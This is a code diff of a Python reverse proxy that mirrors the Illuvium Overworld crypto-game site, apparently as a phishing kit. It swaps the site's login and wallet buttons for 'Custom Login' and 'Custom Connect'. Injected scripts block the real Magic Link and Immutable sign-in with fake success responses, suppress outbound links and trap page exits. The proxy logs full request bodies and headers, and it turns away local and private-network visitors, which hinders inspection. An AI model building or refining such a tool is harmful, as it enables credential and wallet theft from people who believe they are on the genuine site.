@@ -9,9 +9,16 @@ import urllib.parse
 import requests
 from urllib.parse import urljoin
 import io
+import time
+import json
+from datetime import datetime
+import threading
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import gzip
+from ip_validator import DEBUG_MODE
 
 # Configure logging
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
 # Original site URL
@@ -42,28 +49,146 @@ def get_client_ip_wsgi(environ):
     # Fall back to the remote address
     return environ.get('REMOTE_ADDR', '127.0.0.1')
 
-# Import your IP validator (if available)
-try:
-    from ip_validator import validate_ip, x_deux_check_mail
-    # Note: We're not importing get_client_ip from ip_validator anymore
-    # We'll use our custom get_client_ip_wsgi function instead
-except ImportError:
-    # Fallback if the module isn't available
-    logger.warning("IP validator module not found, using fallback functions")
-    def validate_ip(ip, site):
-        return False
+def validate_ip(client_ip, original_site):
+    """
+    Validate if the client IP should be allowed to access the site.
     
-    def x_deux_check_mail(site):
-        return "<html><body>Placeholder</body></html>"
+    Args:
+        client_ip: The client's IP address
+        original_site: The original site URL
+        
+    Returns:
+        bool: True if access should be denied, False if allowed
+    """
+    # Allow access in debug mode for local IPs
+    if DEBUG_MODE:
+        local_ips = ["127.0.0.1", "::1"]
+        if client_ip in local_ips or client_ip.startswith(("192.168.", "10.")):
+            logger.info(f"DEBUG MODE: Allowing access for local IP: {client_ip}")
+            return False
+    
+    # List of IPs or IP ranges to block
+    blocked_ips = [
+        '127.0.0.1',  # Localhost
+        '::1',        # IPv6 localhost
+        '192.168.',   # Private network
+        '10.',        # Private network
+        '172.16.',    # Private network
+        '172.17.',    # Private network
+        '172.18.',    # Private network
+        '172.19.',    # Private network
+        '172.20.',    # Private network
+        '172.21.',    # Private network
+        '172.22.',    # Private network
+        '172.23.',    # Private network
+        '172.24.',    # Private network
+        '172.25.',    # Private network
+        '172.26.',    # Private network
+        '172.27.',    # Private network
+        '172.28.',    # Private network
+        '172.29.',    # Private network
+        '172.30.',    # Private network
+        '172.31.'     # Private network
+    ]
+    
+    # Check if the IP is in the blocked list
+    for blocked_ip in blocked_ips:
+        if client_ip.startswith(blocked_ip):
+            logger.warning(f"Access denied for blocked IP: {client_ip}")
+            return True
+    
+    return False
+
+class RequestDebugger:
+    def __init__(self):
+        self.logger = logging.getLogger('RequestDebugger')
+        self.logger.setLevel(logging.DEBUG)
+        self.request_count = 0
+        self.lock = threading.Lock()
+        
+        # Create debug log directory if it doesn't exist
+        self.debug_dir = 'debug_logs'
+        if not os.path.exists(self.debug_dir):
+            os.makedirs(self.debug_dir)
+            
+        # Create debug log file with timestamp
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        self.debug_file = os.path.join(self.debug_dir, f'debug_{timestamp}.log')
+        
+        # Configure file handler
+        fh = logging.FileHandler(self.debug_file)
+        fh.setLevel(logging.DEBUG)
+        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
+        fh.setFormatter(formatter)
+        self.logger.addHandler(fh)
+        
+    def log_request(self, environ, response=None, error=None):
+        with self.lock:
+            self.request_count += 1
+            request_id = self.request_count
+            
+            # Log request details
+            self.logger.debug(f"\n{'='*80}\nRequest #{request_id}")
+            self.logger.debug(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+            self.logger.debug(f"Method: {environ.get('REQUEST_METHOD', '')}")
+            self.logger.debug(f"Path: {environ.get('PATH_INFO', '')}")
+            self.logger.debug(f"Query: {environ.get('QUERY_STRING', '')}")
+            self.logger.debug(f"Headers: {dict(environ)}")
+            
+            # Log request body if present
+            try:
+                content_length = int(environ.get('CONTENT_LENGTH', 0))
+                if content_length > 0:
+                    request_body = environ['wsgi.input'].read(content_length)
+                    environ['wsgi.input'] = io.BytesIO(request_body)  # Reset stream
+                    self.logger.debug(f"Request Body: {request_body.decode('utf-8', errors='ignore')}")
+            except Exception as e:
+                self.logger.debug(f"Error reading request body: {str(e)}")
+            
+            # Log response or error
+            if response:
+                self.logger.debug(f"\nResponse Status: {response.status_code}")
+                self.logger.debug(f"Response Headers: {dict(response.headers)}")
+                try:
+                    self.logger.debug(f"Response Body: {response.text[:1000]}...")  # First 1000 chars
+                except:
+                    self.logger.debug("Response Body: [Binary data]")
+            
+            if error:
+                self.logger.error(f"Error: {str(error)}")
+                self.logger.error(f"Error Type: {type(error)}")
+                self.logger.error(f"Error Traceback: {error.__traceback__}")
+            
+            self.logger.debug(f"{'='*80}\n")
+
+# Initialize debugger
+debugger = RequestDebugger()
 
 class WSGIHandler:
     def __init__(self):
-        self.directory = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'App_files/Assets')
+        # Get the absolute path of the current directory
+        current_dir = os.path.dirname(os.path.abspath(__file__))
+        self.directory = os.path.join(current_dir, 'App_files', 'Assets')
+        logger.info(f"Initialized with directory: {self.directory}")
+        
+        # Create directory if it doesn't exist
+        os.makedirs(self.directory, exist_ok=True)
+        
+        self.debug_mode = True
+        self.session_id = str(int(time.time()))
+        logger.info(f"Session debugger started - ID: {self.session_id}")
+        self.session = requests.Session()
+        self.session.verify = False
+        self.original_site = "https://overworld.illuvium.io"
+        self.debugger = debugger
 
     def rewrite_urls(self, content):
         """Rewrite URLs to point to proxy server."""
         if isinstance(content, bytes):
             content = content.decode('utf-8', errors='ignore')
+
+        # Fix malformed URLs with double semicolons
+        content = re.sub(r'https;//', 'https://', content)
 
         # Fix Next.js image URLs
         def nextjs_image_replacer(match):
@@ -82,7 +207,7 @@ class WSGIHandler:
                             original_url = f"App_files/Assets{original_url}"
                         return original_url
                 except Exception as e:
-                    self.logger.error(f"Error processing Next.js image URL: {e}")
+                    logger.error(f"Error processing Next.js image URL: {e}")
             return url
 
         # Replace Next.js image URLs
@@ -104,96 +229,379 @@ class WSGIHandler:
         # Fix double proxy issues
         content = content.replace('/proxy/proxy/', '/proxy/')
         
-        return content.encode('utf-8')
-        
+        return content.encode('utf-8') if isinstance(content, str) else content
+
     def modify_buttons_and_links(self, content):
-        """Modify specific buttons, links, and their functionality."""
+        """Modify button and link elements in HTML content."""
         if isinstance(content, bytes):
             content = content.decode('utf-8', errors='ignore')
         
-        # Log the length of content before modifications
-        logger.info(f"Modifying buttons in HTML content of length: {len(content)}")
+        logger.info(f"[{self.session_id}] Modifying buttons and links")
         
-        # 1. Basic button and link modifications
-        content = content.replace(
-            'class="chakra-button css-tm757x"',
-            'class="chakra-button css-tm757x modified-button"'
-        )
-        
-        # 2. Replace login button text - simpler approach
-        content = content.replace(
-            'Log In with Passport',
-            'Custom Login'
-        )
-        
-        # 3. Modify Epic Games launcher links - direct replacement
-        content = content.replace(
-            'com.epicgames.launcher://store/product/illuvium-60064c',
-            'https://google.com?action=epic-redirect'
-        )
-        
-        # 4. Modify Immutable links - direct replacement
-        content = content.replace(
-            'https://auth.immutable.com',
-            'https://google.com?action=immutable-login'
-        )
-        
-        # 5. Add minimal JavaScript that won't block loading
-        minimal_script = '''
-        <script>
-        // Wait for the page to be fully loaded before applying button changes
-        window.addEventListener('load', function() {
-            console.log('Button modification script running');
+        # Button patterns
+        button_patterns = [
+            # Chakra UI button text replacements
+            (r'<button[^>]*class="[^"]*chakra-button[^"]*"[^>]*>Play for Free</button>', 
+             '<button type="button" class="chakra-button css-1253haw claim-button" data-click="start-game">Start Game</button>'),
+            (r'<button[^>]*class="[^"]*chakra-button[^"]*"[^>]*>Log In with Passport</button>', 
+             '<button type="button" class="chakra-button css-1253haw claim-button" data-click="custom-login">Custom Login</button>'),
+            (r'<button[^>]*class="[^"]*chakra-button[^"]*"[^>]*>Connect Wallet</button>', 
+             '<button type="button" class="chakra-button css-1253haw claim-button" data-click="custom-connect">Custom Connect</button>'),
+            (r'<button[^>]*class="[^"]*chakra-button[^"]*"[^>]*>Play Now</button>', 
+             '<button type="button" class="chakra-button css-1253haw claim-button" data-click="start-game">Start Game</button>'),
             
-            // Simple function to prevent default and redirect
-            function redirectHandler(e, url) {
-                e.preventDefault();
-                window.location.href = url;
-            }
+            # Remove click handlers from Chakra buttons
+            (r'<button[^>]*class="[^"]*chakra-button[^"]*"[^>]*onclick="[^"]*"[^>]*>', 
+             lambda m: m.group(0).replace('onclick="', 'data-click="')),
+            (r'<button[^>]*class="[^"]*chakra-button[^"]*"[^>]*onClick="[^"]*"[^>]*>', 
+             lambda m: m.group(0).replace('onClick="', 'data-click="')),
             
-            // Add event listeners with timeout to allow app to initialize first
-            setTimeout(function() {
-                // Handle claim/redeem buttons
-                document.querySelectorAll('button, a.chakra-button').forEach(function(btn) {
-                    if (!btn.textContent) return;
-                    var text = btn.textContent.toLowerCase();
+            # Remove navigation attributes from Chakra buttons
+            (r'<button[^>]*class="[^"]*chakra-button[^"]*"[^>]*href="[^"]*"[^>]*>', 
+             lambda m: m.group(0).replace('href="', 'data-href="')),
+            (r'<button[^>]*class="[^"]*chakra-button[^"]*"[^>]*to="[^"]*"[^>]*>', 
+             lambda m: m.group(0).replace('to="', 'data-to="')),
+            
+            # Block Epic Games store links in Chakra buttons
+            (r'<button[^>]*class="[^"]*chakra-button[^"]*"[^>]*href="https://store\.epicgames\.com/en-US/p/illuvium-60064c"[^>]*>', 
+             '<button type="button" class="chakra-button css-1253haw claim-button" data-href="javascript:void(0)" data-click="start-game">Start Game</button>'),
+            (r'<button[^>]*class="[^"]*chakra-button[^"]*"[^>]*href="com\.epicgames\.launcher://store/product/illuvium-60064c"[^>]*>', 
+             '<button type="button" class="chakra-button css-1253haw claim-button" data-href="javascript:void(0)" data-click="start-game">Start Game</button>'),
+            
+            # Add modified class to Chakra buttons
+            (r'<button[^>]*class="([^"]*chakra-button[^"]*)"[^>]*>', 
+             lambda m: m.group(0).replace('class="', 'class="claim-button ')),
+        ]
+        
+        # Apply patterns and log changes
+        for pattern, replacement in button_patterns:
+            matches = re.findall(pattern, content)
+            if matches:
+                logger.info(f"[{self.session_id}] Found {len(matches)} button matches for pattern: {pattern}")
+                content = re.sub(pattern, replacement, content)
+        
+        # Add click handler script
+        content = content.replace('</body>', '''
+            <script>
+                // Debug logging function
+                function debugLog(type, message, data = {}) {
+                    const timestamp = new Date().toISOString();
+                    console.log(`[${timestamp}] ${type}: ${message}`, data);
+                }
+
+                // Block all protocol handlers
+                function blockProtocolHandlers() {
+                    // Block registerProtocolHandler
+                    navigator.registerProtocolHandler = function() {
+                        debugLog('Protocol', 'Blocked protocol handler registration');
+                        return false;
+                    };
+
+                    // Block custom protocols via links
+                    document.addEventListener('click', function(e) {
+                        const target = e.target.closest('a');
+                        if (target && target.href) {
+                            const url = target.href.toLowerCase();
+                            if (url.startsWith('com.epicgames') || 
+                                url.startsWith('epicgames') || 
+                                url.includes('store.epicgames.com') ||
+                                url.includes('launcher://') ||
+                                url.includes('illuvium-60064c')) {
+                                debugLog('Protocol', 'Blocked custom protocol link', { url });
+                                e.preventDefault();
+                                e.stopPropagation();
+                                return false;
+                            }
+                        }
+                    }, true);
+                }
+
+                // Block all storage access
+                function blockStorageAccess() {
+                    const domains = ['store.epicgames.com', 'auth.magic.link', 'google.com'];
                     
-                    if (text.includes('claim') || text.includes('redeem')) {
-                        btn.addEventListener('click', function(e) {
-                            redirectHandler(e, 'https://google.com?action=claim');
+                    // Override storage APIs
+                    domains.forEach(domain => {
+                        Object.defineProperty(window, 'localStorage', {
+                            get: function() {
+                                if (document.referrer.includes(domain)) {
+                                    debugLog('Storage', `Blocked localStorage access from ${domain}`);
+                                    return {
+                                        getItem: () => null,
+                                        setItem: () => {},
+                                        removeItem: () => {},
+                                        clear: () => {}
+                                    };
+                                }
+                                return window.localStorage;
+                            }
                         });
+
+                        Object.defineProperty(window, 'sessionStorage', {
+                            get: function() {
+                                if (document.referrer.includes(domain)) {
+                                    debugLog('Storage', `Blocked sessionStorage access from ${domain}`);
+                                    return {
+                                        getItem: () => null,
+                                        setItem: () => {},
+                                        removeItem: () => {},
+                                        clear: () => {}
+                                    };
+                                }
+                                return window.sessionStorage;
+                            }
+                        });
+                    });
+                }
+
+                // Block all redirects and navigation
+                function blockAllNavigation() {
+                    const blockedDomains = [
+                        'store.epicgames.com',
+                        'auth.magic.link',
+                        'google.com',
+                        'epicgames.com',
+                        'illuvium-60064c'
+                    ];
+
+                    const blockedProtocols = [
+                        'com.epicgames',
+                        'epicgames',
+                        'launcher'
+                    ];
+
+                    function isBlockedUrl(url) {
+                        if (!url) return false;
+                        url = url.toLowerCase();
+                        return blockedDomains.some(domain => url.includes(domain)) ||
+                               blockedProtocols.some(protocol => url.startsWith(protocol));
                     }
+
+                    // Override window.open
+                    const originalOpen = window.open;
+                    window.open = function(url, ...args) {
+                        if (isBlockedUrl(url)) {
+                            debugLog('Navigation', 'Blocked window.open', {url});
+                            return null;
+                        }
+                        return originalOpen.apply(this, arguments);
+                    };
+
+                    // Override location methods
+                    ['href', 'assign', 'replace', 'reload'].forEach(prop => {
+                        Object.defineProperty(window.location, prop, {
+                            configurable: true,
+                            get: function() {
+                                return function(url) {
+                                    if (isBlockedUrl(url)) {
+                                        debugLog('Navigation', `Blocked location.${prop}`, {url});
+                                        return false;
+                                    }
+                                };
+                            },
+                            set: function(url) {
+                                if (isBlockedUrl(url)) {
+                                    debugLog('Navigation', `Blocked setting location.${prop}`, {url});
+                                    return false;
+                                }
+                            }
+                        });
+                    });
+
+                    // Block history methods
+                    ['pushState', 'replaceState'].forEach(method => {
+                        const original = window.history[method];
+                        window.history[method] = function(state, title, url) {
+                            if (isBlockedUrl(url)) {
+                                debugLog('Navigation', `Blocked history.${method}`, {url});
+                                return;
+                            }
+                            return original.apply(this, arguments);
+                        };
+                    });
+
+                    // Block form submissions
+                    document.addEventListener('submit', function(e) {
+                        const form = e.target;
+                        const action = form.action || '';
+                        if (isBlockedUrl(action)) {
+                            debugLog('Form', 'Blocked form submission', {action});
+                            e.preventDefault();
+                            return false;
+                        }
+                    }, true);
+                }
+
+                // Initialize everything when the DOM is ready
+                document.addEventListener('DOMContentLoaded', function() {
+                    debugLog('Init', 'Starting security measures');
                     
-                    if (text.includes('play') || text.includes('launch')) {
-                        btn.addEventListener('click', function(e) {
-                            redirectHandler(e, 'https://google.com?action=play');
-                        });
-                    }
+                    // Block protocol handlers first
+                    blockProtocolHandlers();
                     
-                    if (text.includes('connect') || text.includes('wallet') || text.includes('login') || text.includes('log in')) {
-                        btn.addEventListener('click', function(e) {
-                            redirectHandler(e, 'https://google.com?action=wallet');
+                    // Block storage access
+                    blockStorageAccess();
+                    
+                    // Block navigation
+                    blockAllNavigation();
+                    
+                    // Setup button handlers
+                    setupButtonHandlers();
+                    
+                    // Watch for dynamic content
+                    const observer = new MutationObserver(function(mutations) {
+                        mutations.forEach(function(mutation) {
+                            if (mutation.addedNodes.length) {
+                                setupButtonHandlers();
+                            }
                         });
-                    }
+                    });
+                    
+                    observer.observe(document.body, {
+                        childList: true,
+                        subtree: true
+                    });
+
+                    debugLog('Init', 'Security measures initialized');
                 });
-                
-                // Add a subtle indicator to show the script is working
-                var indicator = document.createElement('div');
-                indicator.style.cssText = 'position:fixed;bottom:10px;right:10px;width:10px;height:10px;background:green;border-radius:50%;z-index:9999;opacity:0.5;';
-                document.body.appendChild(indicator);
-                
-            }, 2000); // Delay to ensure app is ready
-        });
-        </script>
-        '''
+
+                // Block any remaining redirects
+                window.addEventListener('beforeunload', function(e) {
+                    e.preventDefault();
+                    e.returnValue = '';
+                    return false;
+                }, true);
+
+                // Block popups
+                window.addEventListener('popup', function(e) {
+                    e.preventDefault();
+                    return false;
+                }, true);
+
+                // Additional security: Override window.postMessage
+                const originalPostMessage = window.postMessage;
+                window.postMessage = function(message, targetOrigin, transfer) {
+                    if (targetOrigin === '*' || 
+                        targetOrigin.includes('epicgames.com') || 
+                        targetOrigin.includes('auth.magic.link')) {
+                        debugLog('Security', 'Blocked postMessage', {targetOrigin});
+                        return;
+                    }
+                    return originalPostMessage.apply(this, arguments);
+                };
+            </script>
+            </body>
+        ''')
         
-        # Insert minimal script before the closing body tag
-        if '</body>' in content:
-            content = content.replace('</body>', f'{minimal_script}</body>')
-            logger.info("Minimal button script injected successfully")
-        
-        logger.info("Basic button modifications completed")
-        return content.encode('utf-8')
+        return content.encode('utf-8') if isinstance(content, str) else content
+
+    def process_js_file(self, content, path):
+        """Process JavaScript files for debugging and linting"""
+        if isinstance(content, bytes):
+            content_str = content.decode('utf-8', errors='ignore')
+        else:
+            content_str = content
+            
+        logger.info(f"[{self.session_id}] Processing JS file: {path}")
+
+        try:
+            # Transform any Google redirect URLs in the content
+            redirect_patterns = [
+                # Direct URL assignments
+                (r'window\.location(?:\.href)?\s*=\s*[\'"]https?://(?:www\.)?google\.com[^\'"]*[\'"]', 'window.location.href="#"'),
+                (r'window\.location(?:\.href)?\s*=\s*[\'"]https?://(?:www\.)?google\.[^\'"]*[\'"]', 'window.location.href="#"'),
+                
+                # Function calls with Google URLs
+                (r'\.navigate\s*\(\s*[\'"]https?://(?:www\.)?google\.[^\'"]*[\'"]\s*\)', '.navigate("#")'),
+                (r'\.redirect\s*\(\s*[\'"]https?://(?:www\.)?google\.[^\'"]*[\'"]\s*\)', '.redirect("#")'),
+                
+                # Router pushes with Google URLs
+                (r'router\.push\s*\(\s*[\'"]https?://(?:www\.)?google\.[^\'"]*[\'"]\s*\)', 'router.push("#")'),
+                (r'router\.replace\s*\(\s*[\'"]https?://(?:www\.)?google\.[^\'"]*[\'"]\s*\)', 'router.replace("#")'),
+                
+                # String literals containing Google URLs
+                (r'[\'"]https?://(?:www\.)?google\.com/[^\'"]*[\'"]', '"#"'),
+                (r'[\'"]https?://(?:www\.)?google\.[^\'"]*[\'"]', '"#"'),
+                
+                # URL encoded Google URLs
+                (r'encodeURIComponent\s*\(\s*[\'"]https?://(?:www\.)?google\.[^\'"]*[\'"]\s*\)', 'encodeURIComponent("#")'),
+                (r'escape\s*\(\s*[\'"]https?://(?:www\.)?google\.[^\'"]*[\'"]\s*\)', 'escape("#")'),
+            ]
+
+            # Apply all redirect blocking patterns
+            for pattern, replacement in redirect_patterns:
+                content_str = re.sub(pattern, replacement, content_str, flags=re.IGNORECASE)
+
+            # Add URL transformation script for dynamic content
+            url_transform_script = '''
+                // Transform Google redirect URLs
+                (function() {
+                    const originalURL = window.URL;
+                    const originalURLSearchParams = window.URLSearchParams;
+
+                    // Override URL constructor
+                    window.URL = function(url, base) {
+                        if (typeof url === 'string') {
+                            // Transform any Google URLs
+                            if (url.toLowerCase().includes('google.com') || 
+                                url.toLowerCase().match(/google\.[a-z]+/)) {
+                                console.log('Transformed Google URL:', url);
+                                url = '#';
+                            }
+                        }
+                        return new originalURL(url, base);
+                    };
+                    window.URL.prototype = originalURL.prototype;
+                    window.URL.createObjectURL = originalURL.createObjectURL;
+                    window.URL.revokeObjectURL = originalURL.revokeObjectURL;
+
+                    // Override URLSearchParams to remove Google redirects
+                    window.URLSearchParams = function(init) {
+                        const params = new originalURLSearchParams(init);
+                        const originalGet = params.get;
+                        const originalGetAll = params.getAll;
+                        
+                        params.get = function(name) {
+                            const value = originalGet.call(this, name);
+                            if (value && typeof value === 'string' &&
+                                (value.includes('google.com') || value.match(/google\.[a-z]+/))) {
+                                console.log('Blocked Google redirect in URL param:', name);
+                                return '#';
+                            }
+                            return value;
+                        };
+                        
+                        params.getAll = function(name) {
+                            const values = originalGetAll.call(this, name);
+                            return values.map(value => {
+                                if (value && typeof value === 'string' &&
+                                    (value.includes('google.com') || value.match(/google\.[a-z]+/))) {
+                                    console.log('Blocked Google redirect in URL param array:', name);
+                                    return '#';
+                                }
+                                return value;
+                            });
+                        };
+                        
+                        return params;
+                    };
+                    window.URLSearchParams.prototype = originalURLSearchParams.prototype;
+                })();
+            '''
+
+            # Only add the transform script to non-framework files
+            if not any(x in path for x in [
+                'framework-', 'webpack-', 'main-', 'pages/_app-', 'pages/index-',
+                'reactPlayerFilePlayer', '_buildManifest', '_ssgManifest'
+            ]):
+                content_str = url_transform_script + content_str
+
+            return content_str.encode('utf-8')
+            
+        except Exception as e:
+            logger.error(f"[{self.session_id}] Error processing JS file: {str(e)}")
+            logger.error(traceback.format_exc())
+            return content.encode('utf-8') if isinstance(content, str) else content
 
     def modify_text_content(self, content):
         """Replace text content in HTML elements using JavaScript."""
@@ -269,7 +677,6 @@ class WSGIHandler:
         # Insert text replacement script before the closing body tag
         if '</body>' in content:
             content = content.replace('</body>', f'{text_replacement_script}</body>')
-            logger.info("Text replacement script injected successfully")
         
         return content.encode('utf-8')
 
@@ -339,35 +746,272 @@ class WSGIHandler:
         return content.encode('utf-8')
     
     def modify_chunk_content(self, content):
-        """Modify chunk file content before serving."""
+        """Modify JavaScript chunk content to replace specific text patterns."""
         if isinstance(content, bytes):
             content = content.decode('utf-8', errors='ignore')
         
-        # Replace Epic Games launcher URL with https://google.com
-        content = content.replace(
-            '"com.epicgames.launcher://store/product/illuvium-60064c"',
-            '"https://google.com"'
-        )
+        logger.info(f"[{self.session_id}] Modifying chunk content")
         
-        # Also handle cases where the URL might be in single quotes
-        content = content.replace(
-            "'com.epicgames.launcher://store/product/illuvium-60064c'",
-            "'https://google.com'"
-        )
+        # Skip modification for React framework chunks
+        if 'framework-d5719ebbbcec5741.js' in content:
+            logger.info(f"[{self.session_id}] Skipping React framework chunk")
+            return content.encode('utf-8')
         
-        # Handle cases where the URL might be part of a larger string
-        content = content.replace(
-            'https://auth.immutable.com',
-            'https://google.com?id='
-        )
+        try:
+            # Find and replace any redirect logic in chunks
+            redirect_patterns = [
+                # Direct URL assignments
+                (r'window\.location(?:\.href)?\s*=\s*[\'"]https?://[^\'"]*epicgames[^\'"]*[\'"]', 'window.location.href="#"'),
+                (r'window\.location(?:\.href)?\s*=\s*[\'"]com\.epicgames[^\'"]*[\'"]', 'window.location.href="#"'),
+                
+                # Function calls that might cause redirects
+                (r'window\.open\([\'"]https?://[^\'"]*epicgames[^\'"]*[\'"]\s*[,)]', 'window.open("#")'),
+                (r'window\.open\([\'"]com\.epicgames[^\'"]*[\'"]\s*[,)]', 'window.open("#")'),
+                
+                # Navigation method calls
+                (r'\.navigate\s*\(\s*[\'"]https?://[^\'"]*epicgames[^\'"]*[\'"]\s*\)', '.navigate("#")'),
+                (r'\.navigate\s*\(\s*[\'"]com\.epicgames[^\'"]*[\'"]\s*\)', '.navigate("#")'),
+                
+                # History API calls
+                (r'history\.pushState[^;]*[\'"]https?://[^\'"]*epicgames[^\'"]*[\'"]\s*[,)]', 'history.pushState(null, "", "#")'),
+                (r'history\.replaceState[^;]*[\'"]https?://[^\'"]*epicgames[^\'"]*[\'"]\s*[,)]', 'history.replaceState(null, "", "#")'),
+                
+                # Router pushes
+                (r'router\.push\s*\(\s*[\'"]https?://[^\'"]*epicgames[^\'"]*[\'"]\s*\)', 'router.push("#")'),
+                (r'router\.replace\s*\(\s*[\'"]https?://[^\'"]*epicgames[^\'"]*[\'"]\s*\)', 'router.replace("#")'),
+                
+                # Async navigation
+                (r'await\s+navigate\s*\(\s*[\'"]https?://[^\'"]*epicgames[^\'"]*[\'"]\s*\)', 'await navigate("#")'),
+                
+                # Direct protocol handlers
+                (r'[\'"]com\.epicgames://[^\'"]*[\'"]', '"#"'),
+                (r'[\'"]epicgames://[^\'"]*[\'"]', '"#"'),
+                
+                # Function definitions that might handle redirects
+                (r'function\s+handleRedirect\s*\([^)]*\)\s*{[^}]*epicgames[^}]*}', 'function handleRedirect() { return false; }'),
+                (r'const\s+handleRedirect\s*=\s*[^=>]*=>\s*{[^}]*epicgames[^}]*}', 'const handleRedirect = () => false;'),
+                
+                # Event handlers
+                (r'onClick\s*=\s*{\s*[^}]*(?:epicgames|store\.epicgames\.com)[^}]*}', 'onClick={e => { e.preventDefault(); return false; }}'),
+                (r'onSubmit\s*=\s*{\s*[^}]*(?:epicgames|store\.epicgames\.com)[^}]*}', 'onSubmit={e => { e.preventDefault(); return false; }}'),
+            ]
+            
+            # Apply all redirect blocking patterns
+            for pattern, replacement in redirect_patterns:
+                content = re.sub(pattern, replacement, content, flags=re.IGNORECASE)
+            
+            # Add navigation blocking wrapper
+            navigation_blocker = '''
+                // Navigation blocking wrapper
+                (function() {
+                    const blockedDomains = [
+                        'store.epicgames.com',
+                        'epicgames.com',
+                        'launcher://',
+                        'com.epicgames',
+                        'illuvium-60064c'
+                    ];
+                    
+                    function isBlockedUrl(url) {
+                        return blockedDomains.some(domain => 
+                            url && url.toLowerCase().includes(domain.toLowerCase())
+                        );
+                    }
+                    
+                    // Override navigation methods
+                    const _open = window.open;
+                    window.open = function(url) {
+                        if (isBlockedUrl(url)) return null;
+                        return _open.apply(this, arguments);
+                    };
+                    
+                    const _assign = window.location.assign;
+                    window.location.assign = function(url) {
+                        if (isBlockedUrl(url)) return false;
+                        return _assign.apply(this, arguments);
+                    };
+                    
+                    const _replace = window.location.replace;
+                    window.location.replace = function(url) {
+                        if (isBlockedUrl(url)) return false;
+                        return _replace.apply(this, arguments);
+                    };
+                    
+                    // Override history methods
+                    const _pushState = history.pushState;
+                    history.pushState = function(state, title, url) {
+                        if (isBlockedUrl(url)) return;
+                        return _pushState.apply(this, arguments);
+                    };
+                    
+                    const _replaceState = history.replaceState;
+                    history.replaceState = function(state, title, url) {
+                        if (isBlockedUrl(url)) return;
+                        return _replaceState.apply(this, arguments);
+                    };
+                    
+                    // Block setting location.href
+                    Object.defineProperty(window.location, 'href', {
+                        set: function(url) {
+                            if (isBlockedUrl(url)) return false;
+                            return url;
+                        }
+                    });
+                })();
+            '''
+            
+            # Insert the navigation blocker at the start of the chunk
+            content = navigation_blocker + content
+            
+            # Add error handler to catch and block any remaining redirects
+            error_handler = '''
+                window.addEventListener('error', function(e) {
+                    if (e && e.target && e.target.tagName === 'SCRIPT') {
+                        if (e.target.src && (
+                            e.target.src.includes('epicgames.com') ||
+                            e.target.src.includes('launcher://') ||
+                            e.target.src.includes('com.epicgames')
+                        )) {
+                            e.preventDefault();
+                            return true;
+                        }
+                    }
+                }, true);
+            '''
+            
+            # Add the error handler at the end of the chunk
+            content = content + error_handler
+            
+            # Add fetch request blocking wrapper
+            fetch_blocker = '''
+                // Block specific Magic Link authentication request
+                (function() {
+                    const originalFetch = window.fetch;
+                    window.fetch = async function(resource, init) {
+                        const url = resource instanceof Request ? resource.url : resource;
+                        
+                        // Check if it's the Magic Link auth request
+                        if (url && url.includes('auth.magic.link/send?params=')) {
+                            console.log('Blocked Magic Link authentication request:', url);
+                            
+                            // Return a mock successful response
+                            return new Response(JSON.stringify({
+                                success: true,
+                                blocked: true,
+                                message: 'Authentication request blocked'
+                            }), {
+                                status: 200,
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                    'Access-Control-Allow-Origin': '*'
+                                }
+                            });
+                        }
 
-        content = content.replace(
-            '"Log In with Passport"',
-            '"Log In with Google"'
-        )
-        
-        return content.encode('utf-8')
-    
+                        // Also block any request with specific headers matching Magic Link auth
+                        if (init && init.headers) {
+                            const headers = new Headers(init.headers);
+                            if (headers.get('Sec-Fetch-Dest') === 'iframe' && 
+                                headers.get('Sec-Fetch-Mode') === 'navigate' &&
+                                headers.get('Upgrade-Insecure-Requests') === '1' &&
+                                url.includes('auth.magic.link')) {
+                                console.log('Blocked Magic Link iframe request:', url);
+                                return new Response('', { status: 204 });
+                            }
+                        }
+
+                        return originalFetch.apply(this, arguments);
+                    };
+
+                    // Also block XHR requests to Magic Link
+                    const originalXHR = window.XMLHttpRequest;
+                    function BlockingXHR() {
+                        const xhr = new originalXHR();
+                        const originalOpen = xhr.open;
+
+                        xhr.open = function(method, url, ...args) {
+                            if (url && url.includes('auth.magic.link/send?params=')) {
+                                console.log('Blocked Magic Link XHR request:', url);
+                                Object.defineProperty(this, 'readyState', { value: 4 });
+                                Object.defineProperty(this, 'status', { value: 200 });
+                                Object.defineProperty(this, 'responseText', {
+                                    value: JSON.stringify({
+                                        success: true,
+                                        blocked: true
+                                    })
+                                });
+                                this.send = function() {
+                                    setTimeout(() => {
+                                        if (this.onreadystatechange) {
+                                            this.onreadystatechange();
+                                        }
+                                        if (this.onload) {
+                                            this.onload();
+                                        }
+                                    }, 0);
+                                };
+                                return;
+                            }
+                            return originalOpen.apply(this, arguments);
+                        };
+
+                        return xhr;
+                    }
+                    window.XMLHttpRequest = BlockingXHR;
+
+                    // Block iframe creation for Magic Link
+                    const observer = new MutationObserver((mutations) => {
+                        mutations.forEach((mutation) => {
+                            mutation.addedNodes.forEach((node) => {
+                                if (node.tagName === 'IFRAME') {
+                                    const src = node.src || '';
+                                    if (src.includes('auth.magic.link')) {
+                                        console.log('Blocked Magic Link iframe:', src);
+                                        node.remove();
+                                    }
+                                }
+                            });
+                        });
+                    });
+
+                    observer.observe(document.documentElement, {
+                        childList: true,
+                        subtree: true
+                    });
+
+                    // Block form submissions to Magic Link
+                    document.addEventListener('submit', function(e) {
+                        const form = e.target;
+                        const action = form.action || '';
+                        if (action.includes('auth.magic.link')) {
+                            console.log('Blocked Magic Link form submission:', action);
+                            e.preventDefault();
+                            return false;
+                        }
+                    }, true);
+
+                    // Block window messages from Magic Link
+                    window.addEventListener('message', function(e) {
+                        if (e.origin.includes('auth.magic.link')) {
+                            console.log('Blocked Magic Link message:', e.origin);
+                            e.stopImmediatePropagation();
+                            return false;
+                        }
+                    }, true);
+                })();
+            '''
+
+            # Add the fetch blocker at the start of the content
+            content = fetch_blocker + content
+            
+            return content.encode('utf-8')
+            
+        except Exception as e:
+            logger.error(f"[{self.session_id}] Error modifying chunk: {str(e)}")
+            logger.error(traceback.format_exc())
+            # Return original content if modification fails
+            return content.encode('utf-8') if isinstance(content, str) else content
+
     def modify_html_text(self, content):
